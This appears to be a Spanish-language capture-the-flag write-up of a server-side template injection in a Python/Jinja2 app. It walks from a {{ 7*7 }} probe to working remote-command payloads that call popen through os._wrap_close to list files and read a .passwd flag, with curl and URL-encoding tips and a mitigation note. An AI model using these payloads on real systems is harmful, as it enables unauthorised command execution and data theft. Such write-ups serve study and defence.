
## 📝 Reporte de Explotación: SSTI en Python/Jinja2

### 1. Fase de Detección

Se confirmó la vulnerabilidad de **Server-Side Template Injection** inyectando una operación aritmética básica en el campo `content`.

* **Payload:** `{{ 7*7 }}`
* **Resultado:** `49`
* **Realidad técnica:** El servidor renderiza la entrada del usuario como una plantilla de Jinja2 en lugar de tratarla como texto plano.

---

### 2. Fase de Introspección (Búsqueda del vector)

Dado que no tenemos acceso directo al módulo `os`, navegamos por el árbol de objetos de Python para encontrar una clase con permisos de ejecución.

| Paso | Atributo | Propósito |
| --- | --- | --- |
| **Origen** | `[]` | Iniciamos con un objeto tipo lista. |
| **Clase** | `.__class__` | Accedemos a `<class 'list'>`. |
| **Herencia** | `.__mro__[1]` | Subimos a la clase base `<class 'object'>`. |
| **Listado** | `.__subclasses__()` | Listamos todas las clases cargadas en memoria. |

---

### 3. Fase de Enumeración (Localización del Índice)

Usamos `grep` en Termux para encontrar la posición exacta de la clase `os._wrap_close` en el array de subclases.

* **Comando:** `cat salida.txt | tr ',' '\n' | grep -n "os._wrap_close"`
* **Índice hallado:** `132` (Este número varía según el entorno).

---

### 4. Ejecución de Comandos (RCE)

Utilizamos el método `popen` dentro de los globales de la clase seleccionada para interactuar con el sistema operativo.

**Payloads finales utilizados (URL Encoded):**

1. **Listar archivos (incluyendo ocultos):**
`{{ [].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls -la .').read() }}`
2. **Leer la flag:**
`{{ [].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat .passwd').read() }}`

---

### 5. Herramientas y Trucos en Termux

* **Codificación:** Usamos Python local para evitar que caracteres como `{`, `[` o `_` rompieran la petición HTTP:
`python3 -c "import urllib.parse; print(urllib.parse.quote('''PAYLOAD'''))"`
* **Automatización:** Uso de variables en la shell para limpiar el comando `curl`:
`salida="PAYLOAD_CODIFICADO" && curl -d "content=$salida" ...`

---

### 📑 Conclusión de Auditoría

La vulnerabilidad fue causada por una **desinfectación nula** de la entrada del usuario en la función `render()` del motor Jinja2. La recomendación de mitigación es nunca pasar datos del usuario directamente a constructores de plantillas, o utilizar un entorno de sandboxing estricto.

